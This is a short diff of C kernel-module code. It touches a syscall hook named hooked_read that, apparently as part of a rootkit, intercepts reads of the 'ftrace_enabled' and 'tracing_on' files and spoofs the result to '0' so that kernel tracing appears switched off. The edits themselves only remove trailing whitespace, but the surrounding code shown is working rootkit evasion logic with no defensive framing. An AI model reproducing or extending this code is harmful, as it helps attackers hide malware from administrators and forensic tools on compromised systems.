@@ -19,7 +19,7 @@ static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
     if (file) {
         if (strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
             strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0) {
-            
+
             fput(file); // Free the file object after verification
 
             kernel_buf = kmalloc(B_F, GFP_KERNEL);
@@ -43,7 +43,7 @@ static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
                 kernel_buf[0] = '0';
                 spoof_next_read = 1; // Ensure spoof happens only once
             } else {
-                spoof_next_read = 0; // Reset spoof 
+                spoof_next_read = 0; // Reset spoof
             }
 
             if (copy_to_user(user_buf, kernel_buf, bytes_read)) {
